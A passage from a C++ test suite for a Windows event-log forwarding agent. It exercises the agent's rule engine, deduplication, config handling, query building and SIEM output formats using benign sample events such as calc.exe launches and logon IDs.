        b.push(makeEvt(1, L"Security", {}).xml);
        uint64_t end2 = 0;
        auto s2 = b.snapshotFromAbsolute(end, end2);
        CHECK(s2.size() == 2 && end2 == 5);   // a post-pass cursor of 5 would skip both
        CHECK(b.evictedUnevaluated() == 0);
        // A cursor behind the oldest surviving event counts the gap.
        uint64_t end3 = 0;
        b.trimTo(1);               // popped is now 4
        b.snapshotFromAbsolute(2, end3);
        CHECK(b.evictedUnevaluated() == 2);
        // Non-evaluation readers don't count.
        b.snapshotFromAbsolute(0, end3, /*trackEvicted=*/false);
        CHECK(b.evictedUnevaluated() == 2);
    }

    // --- forward_buffer does not clear the buffer or stop the pass ---
    // Rule A (threshold 1, forward_buffer) and rule B (simple alert) both
    // match the same 4688. If A's forward_buffer broke out of the bucket
    // loop, B would never see the event and the buffer would be wiped.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_fb");
        fs::create_directories("test_rules_fb");
        fs::path dir = "test_rules_fb";
        std::ofstream(dir / "aaa_fb.yaml") <<
            "title: FB first\nid: win_aaa_fb\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n  threshold: 1\n  timeframe: 60s\n  group_by: Computer\n"
            "  actions:\n    - type: forward_buffer\n      destination: data_lake\n";
        std::ofstream(dir / "zzz_simple.yaml") <<
            "title: Simple after\nid: win_zzz_simple\nstatus: test\nlevel: high\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto rulesFb = loadRulesFromDirectory("test_rules_fb");
        CHECK(rulesFb.size() == 2);
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rulesFb);
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\calc.exe"}}).xml);
        size_t f1 = eng.evaluateOnce();
        CHECK(f1 == 2);
        CHECK(countOccurrences("alerts.jsonl", "rule_id: win_zzz_simple") == 1);
        CHECK(buf.size() == 1);                   // NOT cleared
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\calc.exe"}}).xml);
        eng.evaluateOnce();
        // Per-rule cursor: the second forward_buffer sends only event 2.
        CHECK(countOccurrences("data_lake.jsonl", "<EventID>4688</EventID>") == 2);
        CHECK(buf.size() == 2);
        CHECK(eng.stats().forwardBufferCursors == 1);
        fs::remove_all("test_rules_fb");
    }

    // --- also_matched: suppressed Simple rules ride along on the winner ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_am");
        fs::create_directories("test_rules_am");
        fs::path dir = "test_rules_am";
        for (auto [id, level] : std::vector<std::pair<const char*, const char*>>{
                 {"win_am_high", "high"}, {"win_am_low", "low"}, {"win_am_med", "medium"}}) {
            std::ofstream(dir / (std::string(id) + ".yaml")) <<
                "title: " << id << "\nid: " << id << "\nstatus: test\nlevel: " << level << "\n"
                "logsource:\n  product: windows\n  service: security\n"
                "detection:\n  selection:\n    EventID: 4688\n    Image|contains: calc.exe\n"
                "  condition: selection\n"
                "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        }
        auto rulesAm = loadRulesFromDirectory("test_rules_am");
        CHECK(rulesAm.size() == 3);
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rulesAm);
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\calc.exe"}}).xml);
        CHECK(eng.evaluateOnce() == 1);
        std::ifstream af("alerts.jsonl");
        std::string ac((std::istreambuf_iterator<char>(af)), std::istreambuf_iterator<char>());
        CHECK(ac.find("rule_id: win_am_high") != std::string::npos);
        CHECK(ac.find("rule_id: win_am_low") == std::string::npos);
        auto amPos = ac.find("also_matched: ");
        CHECK(amPos != std::string::npos);
        CHECK(ac.find("win_am_low", amPos) != std::string::npos);
        CHECK(ac.find("win_am_med", amPos) != std::string::npos);
        fs::remove_all("test_rules_am");
    }

    // --- Reload while evaluating: no use-after-free (RuleSet swap) ---
    // A pass must hold its own shared reference to the ruleset; raw
    // Detection pointers into a vector that reload() reassigns would dangle.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_race");
        fs::create_directories("test_rules_race");
        fs::path dir = "test_rules_race";
        std::ofstream(dir / "r1.yaml") <<
            "title: R1\nid: win_race_1\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto setA = loadRulesFromDirectory("test_rules_race");
        std::ofstream(dir / "r2.yaml") <<
            "title: R2\nid: win_race_2\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n    Marker: zzz\n  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto setB = loadRulesFromDirectory("test_rules_race");
        CHECK(setA.size() == 1 && setB.size() == 2);
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(setA);
        std::atomic<bool> done{false};
        std::thread reloader([&] {
            for (int i = 0; i < 300; ++i) {
                eng.reload((i & 1) ? setB : setA);
                std::this_thread::sleep_for(std::chrono::microseconds(50));
            }
            done = true;
        });
        size_t fires = 0;
        int pushed = 0;
        while (!done || pushed < 2000) {
            if (pushed < 2000) {
                buf.push(makeEvt(4688, L"Security", {{L"Marker", L"a"}}).xml);
                ++pushed;
            }
            fires += eng.evaluateOnce();
        }
        reloader.join();
        fires += eng.evaluateOnce();
        CHECK(fires == 2000);   // every event alerted exactly once, no crash
        CHECK(eng.ruleCount() == 1 || eng.ruleCount() == 2);
        fs::remove_all("test_rules_race");
    }

    // --- Sequence: a fresh stage-0 restarts the chain; expiry before match ---
    // win_failed_then_success_logon: 4625 then 4624 within 120 s.
    {
        std::vector<Detection> seqRules;
        for (const auto& r : rules) if (r.id == "win_failed_then_success_logon") seqRules.push_back(r);
        CHECK(seqRules.size() == 1);
        using namespace std::chrono;
        auto now = system_clock::now();
        // (1) old 4625, newer 4625, 4624 70 s ago: must fire (anchored on
        //     the second 4625). The 4624 must not be dropped as "expired"
        //     against the first 4625's window.
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
            eng.reload(seqRules);
            buf.push(makeEvt(4625, L"Security", {}).xml, now - seconds(200)); eng.evaluateOnce();
            buf.push(makeEvt(4625, L"Security", {}).xml, now - seconds(100)); eng.evaluateOnce();
            buf.push(makeEvt(4624, L"Security", {}).xml, now - seconds(70));
            CHECK(eng.evaluateOnce() == 1);
        }
        // (2) 4625, then 130 s later another 4625 (window lapsed), then 4624
        //     10 s after that: must fire from the second 4625.
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
            eng.reload(seqRules);
            auto t0 = now - seconds(200);
            buf.push(makeEvt(4625, L"Security", {}).xml, t0); eng.evaluateOnce();
            buf.push(makeEvt(4625, L"Security", {}).xml, t0 + seconds(130)); eng.evaluateOnce();
            buf.push(makeEvt(4624, L"Security", {}).xml, t0 + seconds(140));
            CHECK(eng.evaluateOnce() == 1);
        }
        // (3) 4624 alone, 4624 after a lapsed 4625: no fire.
        {
            EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
            eng.reload(seqRules);
            buf.push(makeEvt(4624, L"Security", {}).xml, now - seconds(300));
            CHECK(eng.evaluateOnce() == 0);
            buf.push(makeEvt(4625, L"Security", {}).xml, now - seconds(250)); eng.evaluateOnce();
            buf.push(makeEvt(4624, L"Security", {}).xml, now - seconds(100));
            CHECK(eng.evaluateOnce() == 0);
        }
    }

    // --- Dedup keyed by (channel, EventRecordID), not the bare id ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_dd");
        fs::create_directories("test_rules_dd");
        std::ofstream(fs::path("test_rules_dd") / "dd.yaml") <<
            "title: DD\nid: win_dedup_chan\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n"
            "detection:\n  selection:\n    EventID: 7777\n  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto rulesDd = loadRulesFromDirectory("test_rules_dd");
        CHECK(rulesDd.size() == 1);
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        eng.reload(rulesDd);
        buf.push(makeEvtRid(5, 7777, L"Security").xml);
        buf.push(makeEvtRid(5, 7777, L"System").xml);     // same id, other channel
        buf.push(makeEvtRid(5, 7777, L"Security").xml);   // true duplicate
        CHECK(eng.evaluateOnce() == 2);
        CHECK(countOccurrences("alerts.jsonl", "rule_id: win_dedup_chan") == 2);
        CHECK(eventDedupKey(makeEvtRid(5, 7777, L"Security")) != eventDedupKey(makeEvtRid(5, 7777, L"System")));
        CHECK(eventDedupKey(makeEvtRid(5, 7777, L"Security")) == eventDedupKey(makeEvtRid(5, 1, L"SECURITY")));
        fs::remove_all("test_rules_dd");
    }

    // --- Threshold state hygiene: expiry drains dedup set, prune drops idle
    //     groups and states of unloaded rules ---
    {
        std::vector<Detection> grouped;
        for (const auto& r : rules) if (r.id == "win_grouped_brute_force") grouped.push_back(r);
        CHECK(grouped.size() == 1);
        using namespace std::chrono;
        auto now = system_clock::now();
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        eng.reload(grouped);
        // One match long ago (threshold is 2, so no fire), then one now: the
        // old entry expires and leaves the dedup set too; otherwise the set
        // would hold 2 keys while the window holds 1 event.
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"bob"}}).xml, now - seconds(1000));
        eng.evaluateOnce();
        CHECK(eng.stats().thresholdIds == 1);
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"bob"}}).xml, now);
        CHECK(eng.evaluateOnce() == 0);           // 1 live match < threshold 2
        CHECK(eng.stats().thresholdIds == 1);     // expired key drained
        // A quiet group whose window lapsed is erased by the prune.
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"alice"}}).xml, now - seconds(5000));
        eng.evaluateOnce();
        CHECK(eng.stats().states == 2);
        eng.pruneNow();
        CHECK(eng.stats().states == 1);   // alice gone, bob (fresh) kept
        // Rule removed from the set: its state goes with it.
        eng.reload({});
        eng.pruneNow();
        CHECK(eng.stats().states == 0);
    }

    // --- applyServerConfig tolerates wrong-typed fields; cidr can't throw ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_types");
        fs::create_directories("test_cfg_types/rules");
        fs::create_directories("test_cfg_types/lists");
        Config bootstrap;
        bootstrap.rules_directory = "test_cfg_types/rules";
        bootstrap.lists_directory = "test_cfg_types/lists";
        bootstrap.retention_seconds = 42;
        ConfigStore::instance().set(bootstrap);
        AgentClient client;
        client.init(bootstrap);
        CHECK(client.applyServerConfig(
            R"({"known_agent":"yes","retention_seconds":"30","poll_interval_seconds":null,)"
            R"("mirror_logs":1,"destinations":{"a":null,"b":42},"rules":[1,{"rule_id":5}],)"
            R"("lists":"nope","commands":[{"id":"x","type":5},7]})"));
        CHECK(ConfigStore::instance().get().retention_seconds == 42);  // bad value ignored
        fs::remove_all("test_cfg_types");
        ConfigStore::instance().set(Config{});

        fs::remove_all("test_rules_cidr");
        fs::create_directories("test_rules_cidr");
        std::ofstream(fs::path("test_rules_cidr") / "c.yaml") <<
            "title: C\nid: win_cidr_bad\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4624\n    IpAddress|cidr: 10.0.0.0/99999999999\n"
            "  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto rulesC = loadRulesFromDirectory("test_rules_cidr");
        CHECK(rulesC.size() == 1);
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        eng.reload(rulesC);
        buf.push(makeEvt(4624, L"Security", {{L"IpAddress", L"10.1.2.3"}}).xml);
        CHECK(eng.evaluateOnce() == 0);   // no throw, no match
        fs::remove_all("test_rules_cidr");
    }

    // --- Relative file destinations resolve against the DATA root ---
    {
        const std::string sep = platformPathSep();
        setDataRootDir("test_cfg_paths" + sep + "data");
        CHECK(resolveFileDestinationPath("./output/a.jsonl") == "test_cfg_paths" + sep + "data" + sep + "output/a.jsonl");
        CHECK(resolveFileDestinationPath("output/a.jsonl") == "test_cfg_paths" + sep + "data" + sep + "output/a.jsonl");
#ifdef _WIN32
        CHECK(resolveFileDestinationPath("/C:/tmp/x.jsonl") == "C:/tmp/x.jsonl");
        CHECK(resolveFileDestinationPath("C:\\abs\\x.jsonl") == "C:\\abs\\x.jsonl");
#else
        CHECK(resolveFileDestinationPath("/var/lib/elf/x.jsonl") == "/var/lib/elf/x.jsonl");
#endif
        CHECK(resolveFileDestinationPath("http://siem:9/in") == "http://siem:9/in");
        // Server-pushed destinations go through the same resolver.
        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_paths");
        fs::create_directories("test_cfg_paths/rules");
        fs::create_directories("test_cfg_paths/lists");
        Config bootstrap;
        bootstrap.rules_directory = "test_cfg_paths/rules";
        bootstrap.lists_directory = "test_cfg_paths/lists";
        ConfigStore::instance().set(bootstrap);
        AgentClient client;
        client.init(bootstrap);
        CHECK(client.applyServerConfig(R"({"destinations":{"alerts":"file://./output/alerts.jsonl"},"rules":[],"lists":[]})"));
        auto d = ConfigStore::instance().get().destinations["alerts"];
        CHECK(d.scheme == "file");
        CHECK(d.path.rfind("test_cfg_paths" + sep + "data" + sep, 0) == 0);
        CHECK(d.path.find("Program Files") == std::string::npos);
        fs::remove_all("test_cfg_paths");
        setDataRootDir("");
        ConfigStore::instance().set(Config{});
    }

    // --- writeRulesToDisk: binary compare (no CRLF churn), enabled flag,
    //     ruleset_hash protocol (absent `rules` key never deletes) ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_hash");
        fs::create_directories("test_cfg_hash/rules");
        fs::create_directories("test_cfg_hash/lists");
        Config bootstrap;
        bootstrap.rules_directory = "test_cfg_hash/rules";
        bootstrap.lists_directory = "test_cfg_hash/lists";
        ConfigStore::instance().set(bootstrap);
        AgentClient client;
        client.init(bootstrap);
        int reloads = 0;
        client.setReloadRules([&] { ++reloads; });
        const std::string r1 = R"({"rule_id":"h_r1","yaml_body":"title: a\nid: h_r1\n","enabled":true})";
        const std::string r2 = R"({"rule_id":"h_r2","yaml_body":"title: b\nid: h_r2\n","enabled":true})";
        const std::string r3off = R"({"rule_id":"h_r3","yaml_body":"title: c\nid: h_r3\n","enabled":false})";
        CHECK(client.applyServerConfig("{\"ruleset_hash\":\"h1\",\"rules\":[" + r1 + "," + r2 + "," + r3off + "],\"lists\":[]}"));
        CHECK(fs::exists("test_cfg_hash/rules/h_r1.yaml"));
        CHECK(fs::exists("test_cfg_hash/rules/h_r2.yaml"));
        CHECK(!fs::exists("test_cfg_hash/rules/h_r3.yaml"));   // disabled: not written
        CHECK(!fs::exists("test_cfg_hash/rules/h_r1.yaml.tmp"));
        CHECK(reloads == 1);
        CHECK(client.appliedRulesetHash() == "h1");
        // Identical ruleset again: nothing rewritten (binary compare), no reload.
        auto mtime = fs::last_write_time("test_cfg_hash/rules/h_r1.yaml");
        std::this_thread::sleep_for(std::chrono::milliseconds(30));
        CHECK(client.applyServerConfig("{\"ruleset_hash\":\"h1\",\"rules\":[" + r1 + "," + r2 + "],\"lists\":[]}"));
        CHECK(fs::last_write_time("test_cfg_hash/rules/h_r1.yaml") == mtime);
        CHECK(reloads == 1);
        // The file on disk has LF bytes, not CRLF.
        {
            std::ifstream f("test_cfg_hash/rules/h_r1.yaml", std::ios::binary);
            std::string s((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            CHECK(s.find('\r') == std::string::npos);
        }
        // Server says unchanged (no rules key): files untouched, no reload.
        CHECK(client.applyServerConfig(R"({"ruleset_hash":"h1","ruleset_unchanged":true})"));
        CHECK(fs::exists("test_cfg_hash/rules/h_r1.yaml") && fs::exists("test_cfg_hash/rules/h_r2.yaml"));
        CHECK(reloads == 1);
        // No rules key at all (server without hash support / malformed): files untouched.
        CHECK(client.applyServerConfig(R"({"ruleset_hash":"zzz"})"));
        CHECK(fs::exists("test_cfg_hash/rules/h_r1.yaml") && fs::exists("test_cfg_hash/rules/h_r2.yaml"));
        CHECK(client.appliedRulesetHash() == "h1");
        // An explicit empty ARRAY still means "no rules".
        CHECK(client.applyServerConfig(R"({"ruleset_hash":"h2","rules":[],"lists":[]})"));
        CHECK(!fs::exists("test_cfg_hash/rules/h_r1.yaml") && !fs::exists("test_cfg_hash/rules/h_r2.yaml"));
        CHECK(reloads == 2);
        CHECK(client.appliedRulesetHash() == "h2");
        fs::remove_all("test_cfg_hash");
        ConfigStore::instance().set(Config{});
    }

#ifdef _WIN32
    // --- XPath: flat up to 20 ids, structured <QueryList> beyond ---
    // Windows rejects >23 "EventID=" terms in one predicate with
    // ERROR_EVT_INVALID_QUERY (15001). The structured form has no such limit.
    {
        std::vector<int> ids20, ids25, ids50;
        for (int i = 0; i < 50; ++i) { if (i < 20) ids20.push_back(4600 + i); if (i < 25) ids25.push_back(4600 + i); ids50.push_back(4600 + i); }
        auto q20 = buildEventIdXPath(L"Application", ids20);
        CHECK(q20.rfind(L"*[System[", 0) == 0);
        auto q25 = buildEventIdXPath(L"Application", ids25);
        CHECK(q25.rfind(L"<QueryList>", 0) == 0);
        size_t selects = 0, pos = 0;
        while ((pos = q25.find(L"<Select ", pos)) != std::wstring::npos) { ++selects; pos += 8; }
        CHECK(selects == 2);
        CHECK(q25.find(L"Path=\"Application\"") != std::wstring::npos);
        CHECK(buildEventIdXPath(L"A&B", {1}) == L"*[System[EventID=1]]");  // flat: no escaping needed

        // Live: a 24-term flat predicate is rejected by this OS...
        std::vector<int> ids24(ids25.begin(), ids25.begin() + 24);
        auto flat24 = buildEventIdXPath(ids24);
        EventBuffer probeBuf;
        EVT_HANDLE hFlat = EvtSubscribe(nullptr, nullptr, L"Application", flat24.c_str(), nullptr,
                                        &probeBuf,
                                        [](EVT_SUBSCRIBE_NOTIFY_ACTION, PVOID, EVT_HANDLE) -> DWORD { return ERROR_SUCCESS; },
                                        EvtSubscribeToFutureEvents);
        DWORD flatErr = hFlat ? 0 : GetLastError();
        if (hFlat) EvtClose(hFlat);
        // ...but the structured 50-id query subscribes, and so does the
        // fallback path when a channel's filtered query is rejected.
        {
            EventBuffer buf2;
            EventCollector collector(buf2);
            std::vector<ChannelQuery> qs{{L"Application", buildEventIdXPath(L"Application", ids50)}};
            int n = collector.subscribeWithQueries(qs);
            if (n == 1) {
                CHECK(flatErr == 15001);   // ERROR_EVT_INVALID_QUERY on the flat form
                // Same set again → skipped (no new generation).
                auto gen = collector.resubscribeGeneration();
                collector.resubscribe(qs);
                CHECK(collector.resubscribeGeneration() == gen);
                // A rejected flat query falls back to "*" instead of dropping the channel.
                std::vector<ChannelQuery> bad{{L"Application", flat24}};
                CHECK(collector.resubscribe(bad) == 1);
                CHECK(collector.resubscribeGeneration() == gen + 1);
                CHECK(collector.subscribedChannels().size() == 1);
            }
            collector.stop();
        }
    }

#endif  // _WIN32

    // --- loadRules: what parses is applied; failures are counted ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_partial");
        fs::create_directories("test_rules_partial");
        fs::path dir = "test_rules_partial";
        for (const char* id : {"win_p1", "win_p2"}) {
            std::ofstream(dir / (std::string(id) + ".yaml")) <<
                "title: P\nid: " << id << "\nstatus: test\nlevel: low\n"
                "logsource:\n  product: windows\n  service: security\n"
                "detection:\n  selection:\n    EventID: 4688\n  condition: selection\n"
                "elf:\n  actions:\n    - type: alert\n      destination: alerts\n"
                "  timeframe: 5m\n";
        }
        std::ofstream(dir / "bad.yaml") << "title: [unterminated\n  :: nope\n";
        LoadSummary s = loadRules("test_rules_partial", "");
        CHECK(s.parsed == 2 && s.failed == 1 && s.applicable());
        CHECK(s.failedFiles.size() == 1);
        bool allParsed = true;
        auto v = loadRulesFromDirectory("test_rules_partial", allParsed);
        CHECK(v.size() == 2 && !allParsed);
        // timeframe units: 5m is 300 s (std::stoi("5m") would yield 5).
        CHECK(v[0].time_window_seconds == 300);
        fs::remove_all("test_rules_partial");
        fs::create_directories("test_rules_partial");
        std::ofstream(dir / "bad.yaml") << "title: [unterminated\n  :: nope\n";
        LoadSummary s2 = loadRules("test_rules_partial", "");
        CHECK(s2.parsed == 0 && s2.failed == 1 && !s2.applicable());
        LoadSummary s3 = loadRules("test_rules_does_not_exist", "");
        CHECK(s3.dirMissing && !s3.applicable());
        fs::remove_all("test_rules_partial");
    }

    // --- A throwing/odd rule is contained to itself; the pass continues ---
    // Condition parse failures are logged once, not per event.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_contain");
        fs::create_directories("test_rules_contain");
        fs::path dir = "test_rules_contain";
        std::ofstream(dir / "a_bad_cond.yaml") <<
            "title: BadCond\nid: win_bad_cond\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n  condition: selection and and (\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        std::ofstream(dir / "b_good.yaml") <<
            "title: Good\nid: win_good_after_bad\nstatus: test\nlevel: low\n"
            "logsource:\n  product: windows\n  service: security\n"
            "detection:\n  selection:\n    EventID: 4688\n  condition: selection\n"
            "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        auto rulesCt = loadRulesFromDirectory("test_rules_contain");
        CHECK(rulesCt.size() == 2);
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        eng.reload(rulesCt);
        for (int i = 0; i < 5; ++i) {
            buf.push(makeEvt(4688, L"Security", {}).xml);
            CHECK(eng.evaluateOnce() == 1);   // the good rule still alerts
        }
        CHECK(countOccurrences("alerts.jsonl", "rule_id: win_good_after_bad") == 5);
        fs::remove_all("test_rules_contain");
    }

    // ============================================================
    // ONE COPY PER DESTINATION
    // ------------------------------------------------------------
    // However many rules ask for an event, a destination receives it once:
    // two forward_buffer rules firing in the same pass snapshot the same
    // buffer, a forward_event rule carries the same events again, and a
    // second fire of a rule overlaps with what others already sent.
    // Different destinations each get their own copy.
    // ============================================================
    {
        namespace fs = std::filesystem;
        auto countLines = [](const std::string& file, const std::string& needle) {
            std::ifstream f(file); std::string line; int n = 0;
            while (std::getline(f, line)) if (line.find(needle) != std::string::npos) ++n;
            return n;
        };
        fs::remove_all("test_rules_once"); fs::create_directories("test_rules_once");
        auto rule = [&](const std::string& id, const std::string& detection, const std::string& actions) {
            std::ofstream("test_rules_once/" + id + ".yaml") <<
                "title: " << id << "\nid: " << id << "\nstatus: test\nlevel: low\n"
                "logsource:\n  product: windows\n  service: security\n"
                "detection:\n" << detection << "  condition: selection\n"
                "elf:\n  actions:\n" << actions;
        };
        // Two buffer rules on the same destination, fired by different events
        // in the same pass (simple rules on one event would be subject to
        // severity selection and only one would fire).
        rule("once_buf_a", "  selection:\n    EventID: 4688\n    CommandLine|contains: trigger\n",
             "    - type: forward_buffer\n      destination: data_lake\n");
        rule("once_buf_b", "  selection:\n    EventID: 4688\n    CommandLine|contains: second\n",
             "    - type: forward_buffer\n      destination: data_lake\n");
        // forward_event on every 4688: one copy to data_lake (overlapping the
        // buffer rules) and one to a second destination.
        rule("once_evt", "  selection:\n    EventID: 4688\n",
             "    - type: forward_event\n      destination: data_lake\n"
             "    - type: forward_event\n      destination: siem\n");
        LoadSummary s = loadRules("test_rules_once", "");
        CHECK(s.parsed == 3);
        for (auto f : {"data_lake.jsonl", "siem.jsonl"}) std::remove(f);
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        eng.reload(s.rules);
        buf.push(makeEvt(4624, L"Security", {{L"TargetUserName", L"a"}}).xml);
        buf.push(makeEvt(4688, L"Security", {{L"CommandLine", L"cmd /c one"}}).xml);
        buf.push(makeEvt(4688, L"Security", {{L"CommandLine", L"cmd /c trigger"}}).xml);
        buf.push(makeEvt(4688, L"Security", {{L"CommandLine", L"cmd /c second"}}).xml);
        eng.evaluateOnce();
        // Four buffered events; data_lake gets each exactly once although
        // once_evt (3 events), once_buf_a (4) and once_buf_b (4) all asked.
        CHECK(countLines("data_lake.jsonl", "<Event>") == 4);
        CHECK(countLines("data_lake.jsonl", "<EventID>4624</EventID>") == 1);
        CHECK(countLines("data_lake.jsonl", "cmd /c trigger") == 1);
        // The other destination gets its own copy of what was sent to it.
        CHECK(countLines("siem.jsonl", "<Event>") == 3);
        // A later fire adds only what arrived since.
        buf.push(makeEvt(4688, L"Security", {{L"CommandLine", L"cmd /c trigger again"}}).xml);
        eng.evaluateOnce();
        CHECK(countLines("data_lake.jsonl", "<Event>") == 5);
        CHECK(countLines("siem.jsonl", "<Event>") == 4);
        // Direct API: the filter is per destination, keyed on (channel, record id).
        BufferedEvent same = makeEvt(4688, L"Security", {{L"CommandLine", L"x"}});
        Forwarder fwd2; fwd2.setConfig(cfg);
        fwd2.forwardEvent(same, "siem", RuleMeta{"r1", "r1", "low", "", "", {}});
        fwd2.forwardEvent(same, "siem", RuleMeta{"r2", "r2", "low", "", "", {}});
        fwd2.forwardEvent(same, "data_lake", RuleMeta{"r1", "r1", "low", "", "", {}});
        CHECK(countLines("siem.jsonl", "<Event>") == 5);
        CHECK(countLines("data_lake.jsonl", "<Event>") == 6);
        fs::remove_all("test_rules_once");
        for (auto f : {"data_lake.jsonl", "siem.jsonl"}) std::remove(f);
    }

    // ============================================================
    // SIEM OUTPUT FORMATS (destination ?format= options)
    // ------------------------------------------------------------
    // parseDestinationUrl, the json/ecs/hec/gelf/sentinel builders,
    // chunking, spool record v2, header blocks, and the raw regression
    // guard (raw must stay byte-identical: it is the payload existing
    // file consumers parse).
    // ============================================================
    {
        namespace fs = std::filesystem;
        using json = nlohmann::json;
        auto slurp = [](const std::string& file) {
            std::ifstream f(file, std::ios::binary);
            return std::string((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        };
        auto lines = [](const std::string& s) {
            std::vector<std::string> out; size_t p = 0;
            while (p < s.size()) { size_t e = s.find('\n', p); if (e == std::string::npos) e = s.size();
                if (e > p) out.push_back(s.substr(p, e - p)); p = e + 1; }
            return out;
        };

        // --- parseDestinationUrl: known keys consumed + stripped ---
        {
            Destination d = parseDestinationUrl("splunk",
                "https://splunk.example.com:8088/services/collector/event?format=hec&token=abc%2F1&index=elf&keep=1");
            CHECK(d.scheme == "https");
            CHECK(d.path == "https://splunk.example.com:8088/services/collector/event?keep=1");
            CHECK(d.opts.format == "hec");
            CHECK(d.opts.token == "abc/1");          // percent-decoded
            CHECK(d.opts.index == "elf");
            CHECK(d.opts.event == "json");           // hec default inner doc
            CHECK(!d.opts.insecure);
            Destination f = parseDestinationUrl("ecsfile", "file://out/ecs.ndjson?format=ecs");
            CHECK(f.scheme == "file" && f.path == "out/ecs.ndjson" && f.opts.format == "ecs");
            Destination r = parseDestinationUrl("plain", "file://out/raw.jsonl");
            CHECK(r.opts.format == "raw" && r.path == "out/raw.jsonl");
            Destination bad = parseDestinationUrl("bad", "file://out/x.jsonl?format=xml");
            CHECK(bad.opts.format == "raw");         // unknown format falls back, logged
            Destination lab = parseDestinationUrl("lab", "http://127.0.0.1:8088/x?format=json&token=t&insecure=1");
            CHECK(lab.opts.insecure && lab.path == "http://127.0.0.1:8088/x");
            setTestEnv("ELF_TEST_SECRET", "from-env");
            Destination env = parseDestinationUrl("s",
                "https://dce.example.com/streams/Custom-ELF_CL?api-version=2023-01-01&format=sentinel&tenant=t1&client=c1&secret=env:ELF_TEST_SECRET");
            CHECK(env.opts.secret == "from-env");
            CHECK(env.opts.tenant == "t1" && env.opts.client == "c1");
            CHECK(env.path == "https://dce.example.com/streams/Custom-ELF_CL?api-version=2023-01-01");
            std::string red = redactedUrl("https://h/p?format=hec&token=SECRET123&index=elf");
            CHECK(red.find("SECRET123") == std::string::npos);
            CHECK(red.find("token=***") != std::string::npos);
            CHECK(red.find("index=elf") != std::string::npos);
        }

        // --- format=json through a real RuleEngine (alert + forward_buffer) ---
        {
            Config jc = cfg;
            jc.server.agent_id = "agent-test";
            jc.destinations["jalerts"] = parseDestinationUrl("jalerts", "file://json_alerts.ndjson?format=json");
            jc.destinations["jlake"] = parseDestinationUrl("jlake", "file://json_lake.ndjson?format=json");
            std::remove("json_alerts.ndjson"); std::remove("json_lake.ndjson");
            fs::remove_all("test_rules_json"); fs::create_directories("test_rules_json");
            std::ofstream("test_rules_json/win_json_fmt.yaml") <<
                "title: JSON format test\nid: win_json_fmt\nstatus: test\nlevel: low\n"
                "description: Calc launched (test)\ntags:\n  - attack.execution\n  - attack.t1059.001\n"
